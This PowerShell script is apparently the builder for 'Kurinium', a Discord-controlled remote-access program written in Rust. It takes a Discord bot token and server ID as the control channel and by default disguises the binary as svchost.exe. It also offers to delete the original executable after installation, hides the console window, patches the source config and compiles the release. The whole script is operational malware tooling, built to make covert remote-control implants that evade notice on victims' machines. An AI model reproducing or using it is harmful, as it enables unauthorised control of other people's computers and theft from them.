$Host.UI.RawUI.WindowTitle = "Kurinium Builder"

$presetsDir = Join-Path $PSScriptRoot "presets"
if (-not (Test-Path $presetsDir)) {
    New-Item -ItemType Directory -Path $presetsDir -Force | Out-Null
}

function Save-Preset {
    param($name, $config)
    $presetPath = Join-Path $presetsDir "$name.json"
    $config | ConvertTo-Json | Set-Content $presetPath
    Write-Host "Preset '$name' saved!" -ForegroundColor Green
}

function Get-Presets {
    $presetFiles = Get-ChildItem -Path $presetsDir -Filter "*.json" -ErrorAction SilentlyContinue
    return $presetFiles | ForEach-Object { $_.BaseName }
}

function Load-Preset {
    param($name)
    $presetPath = Join-Path $presetsDir "$name.json"
    if (Test-Path $presetPath) {
        return Get-Content $presetPath | ConvertFrom-Json
    }
    return $null
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "        KURINIUM BUILDER v2.0          " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

$loadedFromPreset = $false
$config = @{}

# Check for existing presets
$existingPresets = Get-Presets
if ($existingPresets) {
    Write-Host "[0] LOAD SAVED PRESET" -ForegroundColor Magenta
    Write-Host "    Available: $($existingPresets -join ', ')" -ForegroundColor Gray
    $loadPreset = Read-Host "    Enter preset name (or Enter to skip)"
    
    if ($loadPreset -and ($existingPresets -contains $loadPreset)) {
        $config = Load-Preset $loadPreset
        Write-Host "    Preset '$loadPreset' loaded!" -ForegroundColor Green
        $loadedFromPreset = $true
    }
    Write-Host ""
}

if (-not $loadedFromPreset) {
    Write-Host "[1] DISCORD BOT TOKEN" -ForegroundColor Yellow
    Write-Host "    https://discord.com/developers/applications" -ForegroundColor Gray
    $config.token = Read-Host "    Enter Token"
    if ([string]::IsNullOrWhiteSpace($config.token)) {
        Write-Host "ERROR: Token cannot be empty!" -ForegroundColor Red
        exit 1
    }

    Write-Host ""
    Write-Host "[2] DISCORD GUILD ID" -ForegroundColor Yellow
    Write-Host "    Right-click server -> Copy Server ID" -ForegroundColor Gray
    $config.guildId = Read-Host "    Enter Guild ID"
    if ([string]::IsNullOrWhiteSpace($config.guildId)) {
        Write-Host "ERROR: Guild ID cannot be empty!" -ForegroundColor Red
        exit 1
    }

    Write-Host ""
    Write-Host "[3] INTERNAL FILE NAME" -ForegroundColor Yellow
    Write-Host "    This is the name shown in Task Manager (default: svchost.exe)" -ForegroundColor Gray
    $config.fileName = Read-Host "    Enter file name"
    if ([string]::IsNullOrWhiteSpace($config.fileName)) {
        $config.fileName = "svchost.exe"
    }

    Write-Host ""
    Write-Host "[4] AUTO-DELETE ORIGINAL" -ForegroundColor Yellow
    Write-Host "    Delete original exe after installation? (default: yes)" -ForegroundColor Gray
    $autoDelete = Read-Host "    Enable auto-delete? (Y/n)"
    $config.autoDelete = -not ($autoDelete -eq 'n' -or $autoDelete -eq 'N')

    Write-Host ""
    Write-Host "[5] SHOW CONSOLE (Debug)" -ForegroundColor Yellow
    $showConsole = Read-Host "    Show console window? (y/N)"
    $config.showConsole = ($showConsole -eq 'y' -or $showConsole -eq 'Y')

    # Save preset option
    Write-Host ""
    Write-Host "[6] SAVE AS PRESET" -ForegroundColor Magenta
    $savePresetName = Read-Host "    Enter preset name (or Enter to skip)"
    if ($savePresetName) {
        Save-Preset $savePresetName $config
    }
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "         APPLYING CONFIGURATION        " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

# Update config.rs
$configPath = Join-Path $PSScriptRoot "src\config.rs"
$configContent = Get-Content $configPath -Raw

# Update Guild ID
$configContent = $configContent -replace 'pub const GUILD_ID: u64 = \d+;', "pub const GUILD_ID: u64 = $($config.guildId);"

# Update file name in encrypted_strings
$fileNameBytes = [System.Text.Encoding]::UTF8.GetBytes($config.fileName)
# We need to update the file_name function - for now just update the comment
Write-Host "  File Name: $($config.fileName)" -ForegroundColor Gray

# Update auto-delete
if ($config.autoDelete) {
    $configContent = $configContent -replace 'enabled: false,\s*// Set to false to disable autodelete', 'enabled: true, // Set to false to disable autodelete'
    $configContent = $configContent -replace '(pub fn get_autodelete_config.*?enabled:\s*)false', '$1true'
} else {
    $configContent = $configContent -replace 'enabled: true,\s*// Set to false to disable autodelete', 'enabled: false, // Set to false to disable autodelete'
    $configContent = $configContent -replace '(pub fn get_autodelete_config.*?enabled:\s*)true', '$1false'
}

# Update show console
$consoleValue = if ($config.showConsole) { "true" } else { "false" }
$configContent = $configContent -replace 'pub const SHOW_CONSOLE: bool = (true|false);', "pub const SHOW_CONSOLE: bool = $consoleValue;"

Set-Content $configPath -Value $configContent -NoNewline

Write-Host "  Guild ID: $($config.guildId)" -ForegroundColor Gray
Write-Host "  Auto-Delete: $($config.autoDelete)" -ForegroundColor Gray
Write-Host "  Show Console: $($config.showConsole)" -ForegroundColor Gray
Write-Host ""
Write-Host "Configuration saved!" -ForegroundColor Green

Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "            BUILDING RELEASE           " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Red
Write-Host ""

$env:KURINIUM_TOKEN = $config.token
Set-Location $PSScriptRoot
cargo build --release

if ($LASTEXITCODE -eq 0) {
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host "          BUILD SUCCESSFUL!            " -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Output: .\target\release\kurinium.exe" -ForegroundColor Yellow
    Write-Host ""
    
    # Rename output if custom filename
    if ($config.fileName -and $config.fileName -ne "kurinium.exe") {
        $srcExe = Join-Path $PSScriptRoot "target\release\kurinium.exe"
        $dstExe = Join-Path $PSScriptRoot "target\release\$($config.fileName)"
        if (Test-Path $srcExe) {
            Copy-Item $srcExe $dstExe -Force
            Write-Host "Copied to: .\target\release\$($config.fileName)" -ForegroundColor Yellow
        }
    }
} else {
    Write-Host ""
    Write-Host "BUILD FAILED!" -ForegroundColor Red
}
